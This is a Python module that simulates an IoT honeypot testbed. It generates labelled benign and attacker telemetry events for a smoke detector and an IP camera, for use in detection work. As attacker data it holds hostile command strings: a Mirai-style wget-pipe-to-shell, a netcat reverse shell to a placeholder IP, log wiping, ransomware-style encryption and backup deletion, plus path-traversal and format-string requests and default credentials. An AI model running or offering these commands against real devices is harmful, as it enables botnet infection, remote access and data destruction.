"""Physical IoT Deception Testbed + Attacker Entry Layer (simulated).

Replace with real honeypots / radios by pushing events through TelemetryCollector.submit_event()."""
from __future__ import annotations

import random

from ..config import MOCK_BAD_IPS
from ..models import HONEYPOTS, SCENARIOS, EventType, RawEvent


class HoneypotEventSimulator:
    """Physical IoT deception testbed + attacker entry layer, simulated.

    Two honeypots (sensor = smoke detector, camera = IP camera) receive traffic from
      * normal users  : legitimate phone / dashboard access over Wi-Fi or Bluetooth
      * attackers     : one of 7 scenarios (vulnerability scanning, DDoS, Mirai botnet, ransomware,
                        sensor manipulation, unauthorized camera access, zero-day exploit)
    Every event carries ground-truth context (label, actor, entry_vector, honeypot) so the event store is
    time-ordered AND labeled. Swap for real sensors in production via TelemetryCollector.submit_event()."""

    ATTACKERS = list(MOCK_BAD_IPS)
    BENIGN = ["192.168.1.20", "192.168.1.34", "10.0.0.15", "192.168.1.50"]
    CREDS = [("admin", "admin"), ("root", "root"), ("root", "123456"), ("admin", "1234"), ("support", "support")]
    BAD_CMDS = ["wget http://203.0.113.9/mirai.sh -O- | sh", "busybox MIRAI", "cat /etc/passwd",
                "chmod 777 /tmp/.x", "nc -e /bin/sh 198.51.100.7 4444", "rm -rf /var/log/*"]
    RANSOM_CMDS = ["openssl enc -aes-256-cbc -in /data/recordings.db -out /data/recordings.db.locked",
                   "mv /data/config.json /data/config.json.locked", "rm -rf /data/backups",
                   "echo 'YOUR FILES ARE ENCRYPTED' > /README_RESTORE.txt"]
    GOOD_CMDS = ["GET /status", "GET /snapshot.jpg", "uname -a", "GET /api/v1/sensors"]
    DEVICES = list(HONEYPOTS)
    SERVICES = {"smoke_detector": [("mqtt", "client dashboard connected"), ("httpd", "GET /status 200")],
                "ip_camera": [("rtsp", "stream started for authenticated client"), ("httpd", "GET /snapshot.jpg 200")]}

    def __init__(self, seed: int | None, attack_probability: float):
        self.rng = random.Random(seed)
        self.p_attack = attack_probability

    # ---- small builders --------------------------------------------------------------------------------------
    def _ev(self, t: EventType, ts: str, payload: dict) -> RawEvent:
        return RawEvent(event_type=t, timestamp=ts, source="honeypot-sim", payload=payload)

    def _net(self, ts, ip, port, nbytes, packets):
        return self._ev(EventType.NETWORK_TRAFFIC, ts, {"src_ip": ip, "dst_port": port, "protocol": "tcp", "bytes": nbytes, "packets": packets})

    def _pkt(self, ts, ip, size, ttl, flags, entropy):
        return self._ev(EventType.PACKET_CHARACTERISTICS, ts, {"src_ip": ip, "packet_size": size, "ttl": ttl, "tcp_flags": flags, "payload_entropy": entropy})

    def _log(self, ts, level, service, message, ip=None):
        p = {"source": "syslog", "level": level, "service": service, "message": message}
        if ip:
            p["src_ip"] = ip
        return self._ev(EventType.DEVICE_LOG, ts, p)

    def _ble(self, ts, action):
        r = self.rng
        return self._ev(EventType.BLE_EVENT, ts, {"mac": ":".join(f"{r.randint(0, 255):02x}" for _ in range(6)), "action": action, "rssi": r.randint(-90, -40)})

    def _logins(self, ts, ip, proto, n):
        out = []
        for _ in range(n):
            u, _p = self.rng.choice(self.CREDS)
            out.append(self._ev(EventType.LOGIN_ATTEMPT, ts, {"src_ip": ip, "protocol": proto, "username": u, "success": False}))
            out.append(self._ev(EventType.FAILED_LOGIN, ts, {"src_ip": ip, "protocol": proto, "username": u, "reason": "bad_credentials"}))
        return out

    def _session(self, ts, ip, proto, duration, commands):
        sid = f"s-{self.rng.getrandbits(32):08x}"
        evs = [self._ev(EventType.SESSION_INFO, ts, {"src_ip": ip, "session_id": sid, "protocol": proto, "duration_s": duration, "commands_count": len(commands)})]
        evs += [self._ev(EventType.COMMAND_REQUEST, ts, {"src_ip": ip, "session_id": sid, "command": c}) for c in commands]
        return evs

    @staticmethod
    def _tag(evs, label, actor, vector, device):
        for e in evs:
            e.payload.update(label=label, actor=actor, entry_vector=vector, honeypot=HONEYPOTS[device])
        return evs

    # ---- one telemetry window --------------------------------------------------------------------------------
    def generate_window(self, ts: str) -> list[RawEvent]:
        out: list[RawEvent] = []
        if self.rng.random() < self.p_attack:
            name = self.rng.choice(SCENARIOS)
            evs, device, vector = getattr(self, f"_sc_{name}")(ts)
            out += self._tag(evs, name, "attacker", vector, device)
        for _ in range(self.rng.randint(0, 3)):
            evs, device, vector = self._benign(ts)
            out += self._tag(evs, "benign", "normal_user", vector, device)
        if self.rng.random() < 0.5:                       # routine device syslog, independent of visitors
            device = self.rng.choice(self.DEVICES)
            svc, msg = self.rng.choice(self.SERVICES[device])
            out += self._tag([self._log(ts, "info", svc, msg)], "benign", "normal_user", "wifi", device)
        return out

    # ---- normal users ----------------------------------------------------------------------------------------
    def _benign(self, ts):
        r, ip = self.rng, self.rng.choice(self.BENIGN)
        device = r.choice(self.DEVICES)
        vector = r.choice(["wifi", "wifi", "wifi", "bluetooth"])      # a phone app can also use BLE
        evs = [self._net(ts, ip, r.choice([80, 1883, 554]), r.randint(200, 3000), r.randint(2, 12)),
               self._pkt(ts, ip, r.randint(120, 900), 64, "PA", round(r.uniform(2.0, 5.0), 2)),
               self._ev(EventType.DEVICE_INTERACTION, ts, {"src_ip": ip, "device": device, "action": r.choice(["status_query", "stream_request"])}),
               self._ev(EventType.MQTT_EVENT, ts, {"src_ip": ip, "action": "publish", "topic": "home/smoke/telemetry",
                                                   "client_id": "dashboard", "payload_size": r.randint(20, 120)})]
        if vector == "bluetooth":
            evs.append(self._ble(ts, "scan"))
        if device == "ip_camera":
            evs.append(self._ev(EventType.MEDIA_TELEMETRY, ts, {"src_ip": ip, "device": device, "media_type": r.choice(["video", "image", "audio"]),
                                                                "authenticated": True, "frame_rate": r.choice([15, 24, 30]),
                                                                "bitrate_kbps": r.randint(300, 2500), "size_bytes": r.randint(20000, 400000)}))
        if r.random() < 0.3:
            evs += self._session(ts, ip, "http", round(r.uniform(1, 60), 1), [r.choice(self.GOOD_CMDS)])
        return evs, device, vector

    # ---- attack scenarios: each returns (events, targeted_device, entry_vector) -------------------------------
    def _sc_vulnerability_scanning(self, ts):
        r, ip = self.rng, self.rng.choice(self.ATTACKERS)
        vector, device = r.choice(["wifi", "wifi", "bluetooth"]), r.choice(self.DEVICES)
        evs = [self._ev(EventType.SOURCE_IP, ts, {"src_ip": ip, "first_seen": ts, "asn": f"AS{r.randint(1000, 60000)}", "country": "XX"})]
        for port in r.sample([21, 22, 23, 80, 443, 554, 1883, 5683, 8080, 8883, 37777, 49152], r.randint(7, 12)):
            evs.append(self._net(ts, ip, port, r.randint(40, 120), r.randint(1, 3)))
        evs.append(self._pkt(ts, ip, 60, r.choice([32, 48]), "S", round(r.uniform(1.0, 2.5), 2)))
        evs.append(self._log(ts, "warning", "httpd", "connection reset: probe on /admin", ip))
        evs += self._session(ts, ip, "http", round(r.uniform(1, 8), 1), ["GET /cgi-bin/../../etc/passwd"] if r.random() < 0.5 else [])
        if vector == "bluetooth":
            evs.append(self._ble(ts, "scan"))
        return evs, device, vector

    def _sc_ddos(self, ts):
        r, device = self.rng, self.rng.choice(self.DEVICES)
        evs = []
        for ip in r.sample(self.ATTACKERS, r.randint(2, 4)):
            evs.append(self._net(ts, ip, r.choice([80, 554, 1883]), r.randint(300_000, 2_000_000), r.randint(800, 5000)))
            evs.append(self._pkt(ts, ip, 1500, 48, "S", round(r.uniform(3.0, 5.0), 2)))
        evs.append(self._log(ts, "error", "httpd", "connection queue full, dropping requests"))
        evs.append(self._log(ts, "critical", "kernel", "cpu load 98%, watchdog warning"))
        return evs, device, "wifi"

    def _sc_mirai_botnet(self, ts):
        r, ip = self.rng, self.rng.choice(self.ATTACKERS)
        proto, device = r.choice(["ssh", "telnet"]), r.choice(self.DEVICES)
        evs = [self._ev(EventType.SOURCE_IP, ts, {"src_ip": ip, "first_seen": ts, "asn": f"AS{r.randint(1000, 60000)}", "country": "XX"})]
        evs += self._logins(ts, ip, proto, r.randint(4, 12))
        evs.append(self._net(ts, ip, 23, r.randint(4000, 60000), r.randint(30, 400)))
        evs.append(self._pkt(ts, ip, r.choice([60, 1400]), r.choice([32, 48]), "S", round(r.uniform(5.5, 7.9), 2)))
        evs += self._session(ts, ip, proto, round(r.uniform(1, 300), 1), [self.BAD_CMDS[0], r.choice(self.BAD_CMDS[1:])])
        evs.append(self._log(ts, "warning", "telnetd", "multiple failed logins, new process /tmp/.x", ip))
        return evs, device, "wifi"

    def _sc_ransomware(self, ts):
        r, ip = self.rng, self.rng.choice(self.ATTACKERS)
        device = r.choice(self.DEVICES)
        evs = self._logins(ts, ip, "ssh", r.randint(1, 3))
        evs.append(self._ev(EventType.LOGIN_ATTEMPT, ts, {"src_ip": ip, "protocol": "ssh", "username": "root", "success": True}))
        evs += self._session(ts, ip, "ssh", round(r.uniform(30, 600), 1), r.sample(self.RANSOM_CMDS, r.randint(2, 4)))
        evs.append(self._ev(EventType.DEVICE_INTERACTION, ts, {"src_ip": ip, "device": device, "action": "config_change"}))
        evs.append(self._log(ts, "error", "storage", "write storm on /data, files renamed to .locked", ip))
        evs.append(self._pkt(ts, ip, 1400, 48, "PA", round(r.uniform(7.0, 7.9), 2)))
        return evs, device, "wifi"

    def _sc_sensor_manipulation(self, ts):
        r, ip = self.rng, self.rng.choice(self.ATTACKERS)
        vector = r.choice(["wifi", "bluetooth"])
        evs = [self._ev(EventType.MQTT_EVENT, ts, {"src_ip": ip, "action": "publish", "topic": "home/smoke/telemetry",
                                                   "client_id": f"c{r.randint(100, 999)}", "payload_size": r.randint(8, 40), "spoofed": True}),
               self._ev(EventType.DEVICE_INTERACTION, ts, {"src_ip": ip, "device": "smoke_detector", "action": "config_change"}),
               self._net(ts, ip, 1883, r.randint(300, 1500), r.randint(3, 10)),
               self._log(ts, "warning", "mqtt", "alarm threshold modified by unknown client", ip)]
        if vector == "bluetooth":
            evs.append(self._ble(ts, "gatt_write"))
        return evs, "smoke_detector", vector

    def _sc_unauthorized_camera_access(self, ts):
        r, ip = self.rng, self.rng.choice(self.ATTACKERS)
        vector = r.choice(["wifi", "wifi", "bluetooth"])
        evs = self._logins(ts, ip, "http", r.randint(1, 3))
        evs.append(self._net(ts, ip, 554, r.randint(50_000, 400_000), r.randint(40, 300)))
        evs.append(self._ev(EventType.DEVICE_INTERACTION, ts, {"src_ip": ip, "device": "ip_camera", "action": "stream_request"}))
        evs.append(self._ev(EventType.MEDIA_TELEMETRY, ts, {"src_ip": ip, "device": "ip_camera", "media_type": "video", "authenticated": False,
                                                            "frame_rate": 30, "bitrate_kbps": r.randint(1500, 4000), "size_bytes": r.randint(400_000, 2_000_000)}))
        evs += self._session(ts, ip, "http", round(r.uniform(5, 120), 1), ["GET /snapshot.jpg"])
        evs.append(self._log(ts, "warning", "rtsp", "stream opened without credentials", ip))
        if vector == "bluetooth":
            evs.append(self._ble(ts, "pair_attempt"))
        return evs, "ip_camera", vector

    def _sc_zero_day_exploit(self, ts):
        r, ip = self.rng, self.rng.choice(self.ATTACKERS)
        device = r.choice(self.DEVICES)
        evs = [self._net(ts, ip, r.choice([8080, 49152, 37777]), r.randint(2000, 9000), r.randint(3, 12)),
               self._pkt(ts, ip, 1500, 48, "PA", round(r.uniform(7.6, 7.99), 2)),
               self._log(ts, "critical", "httpd", "segfault at 0x41414141 in handler, process restarted", ip),
               self._ev(EventType.DEVICE_INTERACTION, ts, {"src_ip": ip, "device": device, "action": "firmware_download"})]
        evs += self._session(ts, ip, "http", round(r.uniform(1, 20), 1), ["GET /cgi-bin/" + "A" * 64 + "%n%n"])
        return evs, device, "wifi"
